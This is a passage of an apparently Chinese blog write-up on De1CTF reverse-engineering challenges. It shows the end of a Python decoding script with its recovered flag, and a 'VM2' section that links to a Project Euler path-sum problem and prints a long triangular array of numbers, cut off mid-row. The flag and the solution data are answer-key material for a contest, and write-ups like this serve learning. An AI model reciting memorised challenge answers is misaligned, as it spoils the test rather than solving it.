class="number">256</span></span><br><span class="line">print(<span class="string">""</span>.join(list(map(chr,mP.reshape(<span class="number">1</span>,<span class="number">70</span>).tolist()[<span class="number">0</span>]))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># de1ctf&#123;7h3n_f4r3_u_w3ll_5w337_cr4g13_HILL_wh3r3_0f3n_71m35_1_v3_r0v3d&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="VM2"><a href="#VM2" class="headerlink" title="VM2"></a>VM2</h2><p>参考<a href="https://projecteuler.net/problem=67" target="_blank" rel="noopener">https://projecteuler.net/problem=67</a> ，分析出来也不算复杂</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;126&#125;,</span><br><span class="line">&#123;116, 68&#125;,</span><br><span class="line">&#123;114, 67, 36&#125;,</span><br><span class="line">&#123;53, 105, 33, 61&#125;,</span><br><span class="line">&#123;37, 78, 97, 113, 108&#125;,</span><br><span class="line">&#123;88, 122, 93, 110, 52, 95&#125;,</span><br><span class="line">&#123;117, 108, 107, 65, 103, 94, 100&#125;,</span><br><span class="line">&#123;57, 55, 78, 103, 108, 45, 102, 71&#125;,</span><br><span class="line">&#123;111, 41, 122, 114, 89, 101, 44, 105, 85&#125;,</span><br><span class="line">&#123;48, 73, 98, 85, 29, 126, 89, 66, 58, 36&#125;,</span><br><span class="line">&#123;83, 61, 62, 80, 105, 58, 105, 45, 117, 120, 42&#125;,</span><br><span class="line">&#123;105, 80, 31, 48, 111, 120, 115, 40, 124, 38, 64, 78&#125;,</span><br><span class="line">&#123;72, 30, 108, 106, 32, 45, 105, 126, 40, 55, 90, 25, 122&#125;,</span><br><span class="line">&#123;66, 114, 123, 55, 30, 65, 69, 44, 97, 114, 85, 34, 49, 84&#125;,</span><br><span class="line">&#123;33, 44, 78, 44, 34, 120, 36, 34, 102, 126, 122, 105, 114, 35, 80&#125;,</span><br><span class="line">&#123;94, 93, 86, 87, 16, 97, 121, 92, 82, 104, 112, 61, 54, 80, 105, 55&#125;,</span><br><span class="line">&#123;103, 67, 68, 31, 114, 43, 36, 69, 102, 96, 50, 111, 57, 87, 37, 106, 114&#125;,</span><br><span class="line">&#123;39, 37, 71, 53, 48, 63, 59, 111, 125, 87, 40, 39, 108, 43, 90, 58, 118, 62&#125;,</span><br><span class="line">&#123;97, 66, 33, 32, 82, 54, 65, 75, 55, 49, 61, 62, 121, 89, 42, 41, 121, 116, 113&#125;,</span><br><span class="line">&#123;93, 83, 95, 111, 123, 48, 61, 61, 61, 108, 89, 67, 103, 81, 89, 32, 125, 30, 29, 87&#125;,</span><br><span class="line">&#123;65, 116, 73, 64, 24, 81, 61, 80, 63, 41, 97, 53, 29, 111, 72, 40, 58, 88, 110, 100, 74&#125;,</span><br><span class="line">&#123;63, 37, 90, 123, 87, 76, 68, 32, 64, 69, 41, 85, 111, 110, 34, 44, 36, 70, 32, 70, 33, 86&#125;,</span><br><span class="line">&#123;93, 84, 114, 84, 88, 55, 64, 78, 111, 100, 106, 42, 66, 126, 47, 114, 70, 66, 38, 113, 104, 101, 45&#125;,</span><br><span class="line">&#123;81, 69, 32, 106, 57, 76, 45, 100, 73, 64, 77, 29, 72, 36, 100, 79, 54, 122, 54, 92, 46, 72, 53, 72&#125;,</span><br><span class="line">&#123;98, 66, 44, 105, 103, 56, 79, 117, 45, 75, 105, 46, 62, 89, 101, 45, 50, 92, 120, 112, 76, 60, 102, 36, 29&#125;,</span><br><span class="line">&#123;60, 51, 74, 88, 87, 82, 59, 95, 84, 82, 118, 81, 73, 84, 34, 49, 36, 79, 107, 36, 51, 52, 73, 105, 106, 32&#125;,</span><br><span class="line">&#123;119, 36, 40, 82, 37, 94, 53, 105, 103, 109, 90, 76, 78, 58, 51, 99, 32, 84, 34, 81, 96, 48, 94, 70, 44, 90, 39&#125;,</span><br><span class="line">&#123;51, 86, 33, 35, 125, 101, 93, 53, 88, 87, 40, 33, 36, 36, 51, 57, 116, 35, 34, 97, 99, 97, 56, 117, 38, 109, 68, 61&#125;,</span><br><span class="line">&#123;93, 109, 94, 31, 63, 87, 119, 104, 118, 112, 89, 76, 86, 88, 57, 110, 57, 102, 53, 68, 116, 31, 80, 49, 110, 68, 36, 101, 117&#125;,</span><br><span class="line">&#123;75, 55, 53, 64, 55, 79, 104, 53, 78, 59, 45, 125, 106, 63, 89, 40, 44, 123, 46, 81, 116, 56, 100, 95, 69, 41, 35, 43, 97, 64&#125;,</span><br><span class="line">&#123;64, 87, 96, 97, 99, 98, 36, 86, 40, 87, 65, 40, 84, 63, 36, 57, 70, 110, 57, 66, 42, 29, 71, 100, 32, 100, 53, 90, 83, 113, 39&#125;,</span><br><span class="line">&#123;82, 82, 112, 77, 89, 33, 111, 104, 55, 112, 30, 48, 54, 49, 46, 53, 109, 44, 111, 31, 40, 34, 112, 41, 28, 42, 97, 86, 116, 122, 37, 46&#125;,</span><br><span class="line">&#123;31, 36, 58, 119, 118, 65, 119, 113, 125, 102, 48, 32, 91, 69, 89, 111, 63, 47, 100, 126, 48, 50, 49, 72, 53, 106, 52, 72, 112, 80, 30, 70, 49&#125;,</span><br><span class="line">&#123;102, 90, 29, 76, 41, 39, 166, 41, 87, 105, 119, 43, 71, 109, 65, 57, 99, 38, 73, 79, 110, 54, 35, 92, 105, 30, 112, 68, 84, 106, 66, 79, 60, 75&#125;,</span><br><span class="line">&#123;105, 54, 83, 83, 66, 40, 46, 70, 113, 99, 85, 122, 66, 34, 31, 61, 48, 125, 66, 42, 34, 51, 116, 96, 111, 73, 64, 84, 86, 62, 86, 77, 53, 42, 120&#125;,</span><br><span class="line">&#123;69, 116, 63, 54, 105, 118, 51, 38, 44, 68, 32, 121, 34, 96, 78, 123, 30, 123, 74, 117, 48, 72, 51, 47, 77, 83, 37, 59, 63, 76, 31, 80, 112, 119, 52, 92&#125;,</span><br><span class="line">&#123;79, 36, 88, 57, 88, 124, 93, 48, 123, 119, 125, 117, 33, 61, 123, 87, 59, 96, 95, 60, 102, 111, 45, 100, 98, 77, 111, 90, 30, 30, 46, 38, 55, 69, 102, 72, 72&#125;,</span><br><span class="line">&#123;88, 58, 88, 95, 123, 61, 76, 66, 32, 98, 103, 86, 89, 94, 33, 74, 123, 48, 61, 48, 59, 74, 79, 34, 126, 87, 69, 99, 121, 83, 66, 75, 111, 67, 121, 114, 109, 73&#125;,</span><br><span class="line">&#123;28, 47, 87, 41, 44, 65, 53, 105, 93, 108, 72, 122, 45, 78, 125, 108, 75, 43, 80, 115, 64, 79, 96, 44, 39, 55, 49, 61, 125, 47, 81, 54, 100, 88, 83, 90, 87, 61, 90&#125;,</span><br><span class="line">&#123;120, 69, 121, 110, 74, 88, 54, 78, 106, 106, 72, 28, 71, 100, 58, 97, 110, 69, 115, 52, 80, 78, 57, 42, 32, 48, 107, 71, 88, 111, 39, 104, 29, 89, 29, 92, 121, 69, 41, 121&#125;,</span><br><span class="line">&#123;59, 100, 36, 94, 95, 56, 101, 125, 37, 46, 112, 75, 65, 58, 112, 94, 80, 120, 120, 104, 74, 94, 66, 99, 121, 126, 45, 70, 104, 67, 105, 59, 56, 86, 51, 33, 29, 110, 77, 87, 93&#125;,</span><br><span class="line">&#123;59, 28, 71, 57, 43, 78, 42, 108, 125, 42, 37, 89, 113, 106, 77, 89, 72, 87, 97, 65, 58, 112, 92, 88, 91, 33, 99, 36, 41, 49, 83, 70, 36, 75, 93, 96, 110, 118, 87, 67, 63, 88&#125;,</span><br><span class="line">&#123;119, 75, 49, 98, 42, 122, 91, 70, 28, 43, 121, 29, 74, 46, 44, 96, 38, 85, 124, 83, 116, 58, 104, 72, 94, 123, 39, 52, 35, 47, 63, 74, 108, 71, 77, 91, 95, 112, 67, 108, 112, 79, 36&#125;,</span><br><span class="line">&#123;118, 62, 119, 72, 59, 111, 89, 42, 46, 91, 48, 93, 33, 28, 79, 107, 89, 86, 39, 52, 115, 55, 118, 77, 67, 43, 49, 65, 108, 106, 114, 78, 48, 104, 101, 104, 34, 69, 65, 69, 101, 110, 29, 32&#125;,</span><br><span class="line">&#123;73, 46, 104, 93, 51, 45, 32, 59, 29, 111, 58, 126, 119, 85, 123, 99, 118, 63, 89, 58, 82, 56, 80, 69, 39, 64, 53, 85, 99, 74, 93, 46, 109, 102, 39, 75, 51, 114, 118, 112, 29, 34, 30, 103, 113&#125;,</span><br><span class="line">&#123;126, 125, 111, 120, 34, 44, 60, 88, 119, 47, 93, 87, 51, 93, 67, 57, 94, 32, 64, 56, 51, 123, 30, 54, 97, 89, 40, 31, 72, 117, 86, 115, 70, 47, 93, 42, 73, 119, 57, 31, 98, 93, 105, 97, 80, 126&#125;,</span><br><span class="line">&#123;94, 87, 65, 33, 115, 31, 44, 99, 37, 126, 98, 34, 69, 52, 81, 32, 53, 91, 118, 77, 72, 98, 33, 57, 94, 75, 96, 109, 35, 83, 108, 94, 45, 73, 93, 90, 28, 47, 35, 107, 74, 34, 118, 43, 30, 106, 114&#125;,</span><br><span class="line">&#123;45, 81, 105, 76, 107, 75, 104, 67, 95, 50, 87, 115, 85, 107, 60, 84, 38, 96, 82, 80, 91, 29, 121, 76, 87, 119, 43, 62, 108, 48, 36, 52, 39, 51, 123, 45, 29, 32, 76, 30, 77, 104, 33, 59, 111, 54, 45, 65&#125;,</span><br><span class="line">&#123;95, 28, 77, 31, 79, 48, 69, 121, 80, 51, 116, 32, 119, 53, 79, 63, 95, 38, 112, 28, 31, 69, 29, 72, 42, 33, 77, 31, 80, 41, 52, 23, 55, 115, 32, 48, 94, 111, 106, 124, 37, 47, 122, 31, 67, 73, 29, 85, 114&#125;,</span><br><span class="line">&#123;121, 37, 29, 105, 115, 79, 48, 30, 115, 87, 33, 80, 76, 98, 47, 118, 39, 92, 34, 76, 48, 49, 38, 68, 85, 33, 63, 43, 36, 75, 44, 32, 51, 63, 50, 42, 99, 43, 111, 83, 29, 32, 70, 103, 108, 98, 56, 66, 76, 44&#125;,</span><br><span class="line">&#123;91, 66, 86, 111, 113, 43, 44, 93, 30, 36, 70, 33, 91, 45, 90, 56, 95, 33, 50, 34, 114, 41, 53, 62, 44, 39, 125, 68, 80, 91, 105, 45, 126, 54, 55, 111, 107, 94, 102, 89, 37, 38, 103, 117, 81, 34, 32, 81, 68, 66, 93&#125;,</span><br><span class="line">&#123;70, 110, 45, 64, 59, 58, 79, 56, 122, 74, 35, 103, 62, 38, 31, 80, 62, 70, 61, 36, 79, 84, 39, 63, 47, 66, 67, 82, 105, 71, 34, 58, 51, 36, 35, 42, 83, 115, 113, 28, 79, 89, 37, 51, 59, 32, 87, 92, 80, 55, 84, 126&#125;,</span><br><span class="line">&#123;30, 77, 30, 79, 34, 100, 76, 119, 93, 107, 28, 73, 35, 94, 52, 63, 100, 120, 34, 69, 52, 80, 40, 123, 103, 110, 114, 117, 81, 116, 105, 49, 105, 118, 100, 78, 96, 36, 106, 121, 110, 80, 36, 67, 96, 89, 37, 106, 76, 74, 30, 108, 57&#125;,</span><br><span class="line">&#123;98, 81, 100, 60, 78, 103, 86, 81, 106, 64, 83, 72, 111, 44, 89, 48, 125, 96, 68, 122, 92, 51, 66, 64, 89, 30, 51, 75, 81, 91, 73, 109, 98, 51, 42, 94, 36, 43, 123, 95, 79, 101, 106, 95, 59, 48, 40, 105, 123, 87, 36, 96, 47, 63&#125;,</span><br><span class="line">&#123;100, 53, 48, 71, 73, 65, 44, 110, 92, 125, 34, 50, 79, 73, 88, 124, 30, 40, 87, 58, 97, 42, 63, 104, 58, 85, 83, 120, 102, 95, 48, 63, 96, 80, 114, 34, 52, 109, 66, 77, 92, 121, 56, 57, 38, 60, 38, 40, 123, 29, 83, 74, 34, 76, 29&#125;,</span><br><span class="line">&#123;103, 73, 100, 57, 37, 47, 83, 97, 41, 83, 61, 53, 64, 66, 75, 51, 82, 103, 111, 118, 66, 113, 122, 88, 77, 41, 80, 120, 91, 94, 64, 58, 37, 111, 69, 121, 75, 47, 37, 99, 87, 88, 111, 106, 96, 92, 126, 100, 116, 52, 112, 75, 119, 83, 124, 43&#125;,</span><br><span class="line">&#123;30, 41, 107, 54, 49, 57, 71, 54, 94, 102, 106, 59, 78, 81, 108, 56, 92, 41, 46, 31, 40, 109, 31, 118, 70, 67, 39, 79, 56, 126, 34, 103, 87, 52, 28, 34, 126, 98, 64, 119, 67, 74, 126, 93, 84, 28, 70, 71, 49, 67, 80, 80, 36, 96, 50, 108, 34&#125;,</span><br><span class="line">&#123;76, 107, 83, 117, 120, 114, 74, 40, 102, 55, 114, 50, 99, 106, 59, 45, 54, 47, 55, 37, 64, 86, 48, 45, 97, 31, 106, 123, 30, 58, 72, 98, 108, 33, 41, 45, 112, 32, 58, 77, 119, 106, 50, 74, 36, 66, 74, 118, 70, 81, 96, 74, 69, 122, 89, 73, 59, 112&#125;,</span><br><span class="line">&#123;64, 45, 89, 112, 114, 55, 91, 32, 104, 78, 74, 53, 57, 92, 32, 97, 92, 102, 86, 107, 69, 79, 52, 47, 71, 37, 119, 44, 98, 122, 79, 41, 104, 40, 51, 82, 52, 92, 53, 36, 28, 57, 90, 42, 76, 75, 68, 44, 94, 74, 30, 95, 47, 117, 125, 59, 31, 67, 95&#125;,</span><br><span class="line">&#123;117, 78, 85, 87, 33, 82, 50, 95, 32, 46, 100, 121, 109, 63, 123, 70, 65, 117, 114, 55, 60, 110, 32, 44, 97, 110, 123, 120, 33, 31, 105, 74, 107, 33, 50, 39, 55, 50, 114, 99, 126, 41, 77, 125, 119, 65, 117, 91, 88, 85, 103, 121, 63, 93, 114, 107, 78, 62, 88, 65&#125;,</span><br><span class="line">&#123;84, 122, 91, 33, 80, 63, 109, 78, 67, 60, 74, 41, 34, 125, 105, 92, 66, 85, 80, 33, 77, 80, 31, 96, 67, 95, 63, 96, 102, 105, 102, 87, 30, 59, 66, 50, 104, 74, 53, 117, 40, 67, 71, 98, 117, 103, 78, 51, 63, 77, 52, 72, 97, 107, 88, 107, 88, 70, 117, 91, 38&#125;,</span><br><span class="line">&#123;45, 56, 113, 83, 95, 69, 106, 37, 69, 71, 57, 39, 123, 45, 50, 45, 79, 86, 29, 126, 94, 73, 87, 113, 70, 65, 82, 44, 71, 120, 69, 48, 82, 41, 74, 61, 125, 43, 76, 51, 50, 56, 123, 78, 82, 37, 73, 80, 54, 119, 54, 73, 90, 84, 57, 92, 70, 54, 48, 47, 51, 110&#125;,</span><br><span class="line">&#123;108, 99, 120, 46, 96, 79, 75, 28, 40, 110, 119, 96, 47, 75, 96, 86, 47, 89, 32, 69, 55, 116, 117, 126, 59, 97, 111, 44, 35, 114, 63, 30, 87, 58, 63, 63, 119, 53, 124, 63, 75, 81, 83, 83, 54, 43, 118, 35, 50, 38, 114, 126, 60, 74, 29, 41, 71, 100, 97, 126, 70, 62, 60&#125;,</span><br><span class="line">&#123;117, 83, 88, 113, 83, 39, 97, 86, 90, 59, 28, 42, 108, 74, 98, 103, 122, 59, 92, 107, 81, 97, 61, 78, 67, 72, 60, 31, 91, 82, 105, 95, 115, 74, 58, 74, 95, 105, 30, 111, 50, 71, 116, 99, 62, 35, 58, 103, 90, 53, 117, 112, 123, 94, 92, 118, 46, 41, 44, 113, 31, 98, 59, 122&#125;,</span><br><span class="line">&#123;64, 40, 31, 44, 90, 62, 64, 55, 83, 89, 113, 60, 34, 64, 37, 71, 79, 109, 79, 33, 46, 79, 84, 102, 117, 53, 118, 51, 33, 48, 41, 94, 103, 57, 73, 41, 62, 116, 116, 68, 30, 91, 83, 124, 114, 90, 49, 61, 30, 106, 44, 72, 38, 80, 52, 83, 123, 88, 50, 45, 90, 58, 64, 64, 74&#125;,</span><br><span class="line">&#123;104, 50, 53, 97, 99, 103, 104, 31, 55, 91, 98, 96, 41, 112, 123, 81, 122, 75, 33, 89, 126, 110, 113, 104, 124, 102, 98, 93, 57, 46, 84, 117, 60, 28, 87, 88, 41, 39, 117, 104, 59, 104, 83, 68, 45, 41, 114, 76, 37, 41, 117, 91, 45, 77, 48, 101, 41, 43, 115, 32, 72, 100, 109, 74, 101, 71&#125;,</span><br><span class="line">&#123;49, 124, 68, 40, 61, 58, 81, 88, 83, 121, 30, 51, 86, 54, 125, 104, 31, 36, 64, 67, 39, 53, 114, 36, 98, 97, 34, 45, 91, 84, 107, 48, 39, 98, 110, 121, 87, 66, 100, 106, 126, 44, 124, 59, 91, 56, 68, 34, 75, 111, 112, 94, 39, 101, 122, 47, 51, 79, 68, 94, 83, 88, 56, 120, 62, 99, 96&#125;,</span><br><span class="line">&#123;99, 50, 90, 93, 28, 38, 34, 57, 79, 83, 122, 43, 92, 53, 110, 117, 77, 101, 87, 45, 43, 75, 70, 104, 64, 38, 126, 125, 57, 121, 118, 53, 89, 100, 72, 39, 114, 100, 74, 54, 28, 116, 93, 126, 48, 68, 122, 107, 29, 80, 50, 59, 88, 75, 59, 69, 70, 110, 41, 93, 122, 118, 46, 108, 107, 94, 52, 115&#125;,</span><br><span class="line">&#123;35, 89, 59, 45, 166, 41, 110, 98, 64, 123, 38, 110, 66, 126, 32, 43, 50, 54, 37, 94, 29, 52, 71, 38, 82, 58, 73, 91, 68, 83, 71, 101, 53, 108, 78, 58, 72, 112, 114, 36, 108, 104, 49, 55, 103, 96, 73, 75, 91, 114, 94, 103, 54, 116, 58, 38, 101, 43, 89, 30, 87, 121, 69, 74, 36, 61, 121, 120, 99&#125;,</span><br><span class="line">&#123;83, 45, 117, 45, 69, 164, 69, 59, 41, 113, 33, 80, 60, 122, 126, 62, 56, 42, 71, 47, 76, 86, 52, 81, 61, 86, 111, 48, 50, 81, 62, 117, 105, 43, 117, 40, 64, 115, 81, 46, 113, 94, 114, 82, 93, 111, 92, 69, 125, 64, 114, 83, 60, 55, 85, 65, 55, 65, 93, 54, 79, 48, 108, 42, 35, 49, 124, 59, 112, 54&#125;,</span><br><span class="line">&#123;118, 80, 67, 55, 40, 61, 118, 52, 28, 90, 77, 64, 49, 76, 98, 85, 59, 55, 57, 45, 95, 121, 50, 110, 90, 89, 121, 103, 107, 68, 117, 49, 109, 79, 56, 39, 45, 83, 37, 35, 62, 41, 101, 84, 50, 92, 94, 67, 99, 66, 120, 66, 97, 116, 67, 61, 34, 73, 121, 49, 47, 32, 80, 91, 83, 57, 32, 83, 88, 115, 54&#125;,</span><br><span class="line">&#123;50, 122, 38, 39, 64, 96, 95, 51, 93, 37, 114, 97, 70, 77, 102, 34, 89, 68, 110, 85, 122, 120, 116, 106, 72, 66, 29, 49, 32, 49, 122, 70, 89, 38, 95, 56, 44, 67, 53, 71, 52, 98, 101, 43, 97, 112, 46, 52, 86, 121, 117, 66, 68, 107, 88, 97, 82, 87, 111, 60, 122, 103, 69, 90, 42, 36, 30, 67, 65, 39, 30, 59&#125;,</span><br><span class="line">&#123;36, 111, 83, 107, 88, 82, 112, 124, 43, 121, 109, 121, 125, 84, 111, 57, 111, 75, 120, 117, 98, 32, 122, 117, 100, 44, 57, 125, 67, 91, 92, 116, 34, 106, 36, 46, 83, 63, 69, 57, 50, 96, 126, 99, 34, 32, 54, 88, 51, 58, 70, 75, 98, 111, 48, 55, 53, 92, 92, 86, 92, 101, 104, 47, 37, 108, 88, 111, 122, 35, 79, 50, 97&#125;,</span><br><span class="line">&#123;74, 108, 55, 36, 125, 78, 94, 91, 62, 78, 86, 63, 119, 109, 104, 92, 107, 51, 99, 80, 49, 34, 54, 37, 48, 55, 57, 49, 75, 109, 107, 75, 83, 47, 41, 70, 45, 52, 77, 122, 117, 58, 101, 35, 36, 75, 71, 107, 117, 49, 120, 72, 109, 44, 40, 123, 52, 53, 35, 100, 61, 126, 33, 76, 51, 33, 110, 78, 67, 41, 42, 37, 52, 28&#125;,</span><br><span class="line">&#123;81, 52, 37, 108, 57, 91, 51, 101, 102, 107, 63, 102, 109, 87, 49, 96, 99, 118, 72, 94, 30, 89, 106, 81, 116, 101, 71, 110, 91, 123, 93, 100, 71, 57, 101, 77, 64, 32, 36, 124, 97, 28, 100, 73, 64, 118, 66, 102, 102, 45, 85, 79, 99, 105, 78, 108, 113, 79, 35, 124, 28, 73, 70, 93, 125, 89, 108, 45, 97, 120, 100, 35, 59, 73, 61&#125;,</span><br><span class="line">&#123;123, 107, 109, 34, 86, 98, 119, 80, 46, 47, 115, 93, 30, 51, 53, 37, 51, 54, 77, 109, 121, 100, 90, 35, 78, 60, 49, 72, 46, 40, 85, 60, 117, 42, 49, 77, 63, 40, 82, 33, 62, 74, 103, 79, 60, 88, 63, 54, 55, 73, 125, 41, 100, 47, 100, 59, 43, 53, 107, 80, 74, 93, 103, 65, 121, 72, 29, 28, 49, 79, 74, 123, 91, 85, 79, 66&#125;,</span><br><span class="line">&#123;115, 73, 50, 66, 101, 90, 108, 91, 47, 117, 60, 60, 103, 82, 85, 53, 37, 73, 69, 53, 100, 101, 39, 110, 59, 70, 36, 29, 100, 82, 113, 81, 112, 61, 55, 50, 56, 106, 118, 89, 74, 68, 34, 101, 126, 49, 75, 117, 47, 32, 123, 102, 122, 31, 70, 55, 108, 66, 108, 28, 55, 69, 105, 52, 66, 104, 117, 84, 85, 125, 44, 63, 100, 49, 90, 101, 78&#125;,</span><br><span class="line">&#123;56, 66, 101, 121, 122, 105, 91, 51, 65, 113, 90, 114, 120, 33, 97, 119, 49, 43, 107, 91, 56, 79, 47, 54, 50, 77, 41, 40, 114, 42, 99, 123, 108, 49, 35, 76, 99, 57, 97, 51, 106, 58, 43, 115, 86, 48, 116, 61, 123, 118, 75, 103, 70, 80, 115, 28, 84, 107, 50, 108, 117, 106, 85, 28, 107, 114, 44, 126, 113, 117, 99, 90, 59, 96, 41, 55, 115, 96&#125;,</span><br><span class="line">&#123;64, 44, 98, 122, 83, 120, 98, 62, 70, 72, 31, 125, 119, 121, 111, 123, 38, 57, 58, 54, 58, 87, 119, 30, 75, 32, 125, 118, 113, 121, 62, 117, 117, 35, 75, 46, 60, 55, 95, 64, 86, 53, 92, 126, 77, 95, 49, 34, 36, 76, 61, 58, 104, 76, 70, 33, 102, 44, 108, 114, 88, 106, 79, 53, 54, 99, 56, 77, 34, 125, 113, 28, 44, 37, 73, 91, 51, 45, 83&#125;,</span><br><span class="line">&#123;78, 57, 52, 121, 115, 112, 106, 118, 67, 60, 90, 111, 76, 94, 125, 119, 42, 53, 102, 46, 109, 32, 45, 105, 92, 120, 88, 75, 118, 70, 86, 68, 97, 78, 49, 42, 119, 108, 94, 118, 73, 125, 38, 38, 97, 58, 93, 37, 125, 92, 110, 48, 32, 83, 32, 125, 100, 94, 73, 101, 96, 61, 35, 57, 32, 79, 34, 125, 59, 122, 57, 121, 92, 77, 51, 90, 55, 108, 126, 84&#125;,</span><br><span class="line">&#123;46, 50, 88, 63, 36, 116, 98, 125, 92, 44, 57, 56, 116, 53, 106, 101, 121, 38, 71, 75, 124, 81, 108, 82, 66, 93, 96, 72, 55, 74, 40, 113, 42, 103, 101, 97, 111, 59, 63, 60, 106, 47, 105, 41, 68, 110, 116, 55, 108, 32, 126, 93, 108, 113, 65, 53, 33, 52, 40, 87, 81, 82, 50, 80, 54, 32, 116, 52, 50, 38, 40, 81, 86, 81, 83, 61, 43, 51, 80, 71, 33&#125;,</span><br><span class="line">&#123;40, 67, 84, 99, 48, 42, 87, 35, 31, 46, 38, 125, 61, 72, 36, 124, 113, 98, 30, 42, 83, 46, 42, 71, 124, 58, 117, 31, 112, 114, 103, 35, 39, 57, 51, 89, 111, 55, 39, 112, 109, 80, 126, 79, 40, 100, 33, 92, 124, 113, 36, 77, 121, 95, 96, 101, 57, 94, 114, 121, 90, 34, 105, 54, 107, 63, 96, 68, 33, 119, 59, 105, 64, 109, 57, 32, 45, 114, 126, 99, 46, 126&#125;,</span><br><span class="line">&#123;71, 47, 82, 104, 96, 118, 54, 58, 55, 108, 107, 54, 29, 34, 124, 50, 122, 125, 39, 52, 102, 56, 74, 98, 34, 74, 105, 66, 68, 86, 54, 103, 40, 42, 93, 88, 95, 62, 96, 113, 43, 80, 94, 90, 125, 126, 68, 83, 35, 55, 60, 67, 121, 103, 117, 112, 58, 97, 51, 92, 111, 92, 126, 109, 46, 52, 81, 64, 48, 73, 60, 29, 79, 126, 78, 60, 53, 31, 114, 29, 35, 45, 123&#125;,</span><br><span class="line">&#123;81, 69, 88, 72, 118, 33, 91, 106, 107, 109, 59, 43, 110, 90, 69, 76, 46, 105, 92, 124, 67, 69, 41, 88, 76, 61, 31, 45, 52, 125, 86, 57, 109, 99, 53, 115, 81, 63, 48, 102, 30, 115, 126, 80, 73, 116, 82, 105, 49, 121, 61, 67, 95, 114, 111, 52, 57, 103, 52, 35, 119, 111, 69, 88, 67, 65, 36, 126, 67, 50, 56, 66, 73, 82, 37, 117, 62, 111, 83, 97, 90, 50, 118, 66&#125;,</span><br><span class="line">&#123;79, 119, 30, 98, 116, 34, 36, 64, 95, 93, 85, 47, 71, 119, 78, 83, 40, 98, 106, 126, 53, 64, 29, 33, 43, 94, 63, 79, 85, 43, 106, 100, 83, 87, 86, 54, 71, 104, 121, 109, 46, 77, 125, 60, 36, 104, 121, 63, 67, 110, 91, 110, 85, 112, 44, 103, 80, 29, 110, 79, 49, 54, 66, 47, 75, 119, 72, 48, 36, 69, 51, 50, 39, 64, 79, 55, 77, 105, 106, 47, 113, 89, 100, 47, 86&#125;,</span><br><span class="line">&#123;81, 123, 107, 42, 118, 117, 126, 97, 37, 36, 85, 117, 120, 77, 108, 126, 81, 65, 63, 37, 57, 38, 62, 111, 43, 72, 109, 45, 38, 124, 63, 70, 123, 106, 124, 92, 67, 75, 50, 46, 44, 58, 91, 79, 92, 114, 64, 59, 92, 103, 126, 106, 61, 92, 106, 54, 82, 60, 30, 28, 60, 54, 88, 55, 93, 35, 31, 97, 76, 73, 75, 110, 28, 72, 46, 123, 40, 108, 41, 48, 58, 106, 120, 112, 77, 32&#125;,</span><br><span class="line">&#123;119, 119, 75, 111, 86, 125, 58, 80, 50, 54, 42, 49, 106, 122, 51, 103, 32, 106, 43, 120, 124, 116, 65, 116, 69, 110, 29, 115, 121, 122, 109, 48, 28, 124, 75, 66, 58, 105, 36, 92, 77, 83, 124, 88, 28, 34, 101, 54, 48, 50, 41, 42, 107, 124, 71, 105, 76, 62, 60, 72, 108, 101, 61, 32, 58, 84, 36, 65, 121, 34, 96, 81, 96, 59, 92, 95, 73, 95, 105, 117, 51, 55, 76, 78, 72, 113, 62&#125;,</span><br><span class="line">&#123;68, 90, 116, 103, 114, 58, 113, 36, 73, 41, 114, 109, 49, 56, 74, 43, 40, 37, 97, 99, 109, 122, 74, 91, 85, 70, 40, 102, 69, 96, 48, 39, 94, 40, 91, 111, 85, 50, 125, 36, 64, 103, 32, 49, 58, 39, 101, 77, 56, 126, 113, 99, 72, 52, 37, 55, 46, 33, 117, 70, 56, 58, 94, 106, 73, 52, 101, 41, 124, 62, 103, 64, 92, 73, 50, 109, 33, 49, 57, 103, 120, 93, 121, 44, 123, 40, 47, 99&#125;,</span><br><span class="line">&#123;90, 67, 105, 35, 79, 36, 117, 68, 97, 55, 63, 41, 73, 71, 112, 123, 51, 79, 85, 42, 114, 64, 32, 125, 126, 66, 40, 88, 103, 65, 71, 126, 110, 101, 117, 49, 80, 107, 83, 125, 57, 78, 90, 66, 71, 57, 126, 118, 31, 49, 54, 100, 44, 62, 80, 45, 62, 72, 81, 83, 54, 105, 75, 40, 96, 63, 71, 65, 98, 52, 57, 83, 42, 49, 100, 70, 59, 96, 86, 52, 120, 110, 72, 38, 61, 121, 71, 66, 119&#125;,</span><br><span class="line">&#123;39, 63, 83, 115, 40, 123, 43, 39, 82, 81, 38, 74, 46, 105, 44, 44, 95, 108, 104, 78, 69, 82, 126, 112, 93, 54, 108, 106, 120, 69, 92, 88, 96, 101, 41, 28, 45, 83, 39, 28, 85, 64, 118, 49, 69, 93, 118, 52, 46, 31, 123, 68, 52, 72, 45, 96, 123, 115, 63, 120, 37, 39, 125, 59, 71, 109, 110, 31, 99, 118, 31, 54, 100, 34, 61, 64, 98, 87, 86, 58, 25, 80, 81, 71, 123, 120, 110, 63, 31, 72&#125;,</span><br><span class="line">&#123;57, 45, 49, 47, 69, 123, 92, 106, 44, 68, 82, 96, 121, 108, 56, 107, 118, 58, 112, 52, 74, 53, 70, 76, 29, 126, 61, 94, 126, 103, 43, 41, 42, 120, 35, 59, 126, 71, 88, 104, 94, 77, 70, 82, 114, 82, 80, 101, 44, 73, 89, 52, 77, 126, 100, 32, 120, 75, 44, 58, 97, 107, 86, 36, 71, 86, 72, 40, 101, 93, 85, 121, 114, 100, 43, 41, 112, 65, 101, 126, 91, 50, 106, 55, 98, 69, 47, 64, 109, 58, 50&#125;,</span><br><span class="line">&#123;78, 123, 66, 92, 73, 98, 83, 40, 56, 95, 80, 113, 72, 60, 78, 76, 39, 118, 48, 48, 103, 112, 29, 44, 125, 42, 73, 39, 87, 48, 115, 57, 119, 110, 71, 86, 69, 77, 54, 115, 73, 113, 121, 100, 72, 81, 50, 114, 41, 37, 121, 48, 47, 61, 50, 78, 31, 110, 126, 102, 117, 90, 87, 43, 49, 60, 110, 97, 38, 59, 37, 77, 56, 57, 110, 73, 38, 32, 58, 44, 113, 69, 76, 28, 71, 90, 55, 87, 34, 105, 122, 67&#125;,</span><br><span class="line">&#123;71, 88, 116, 86, 31, 76, 78, 54, 96, 98, 73, 103, 71, 31, 36, 61, 83, 66, 42, 33, 121, 118, 102, 117, 92, 54, 83, 50, 101, 33, 50, 60, 63, 96, 41, 66, 32, 61, 62, 84, 60, 49, 103, 73, 83, 37, 88, 92, 116, 36, 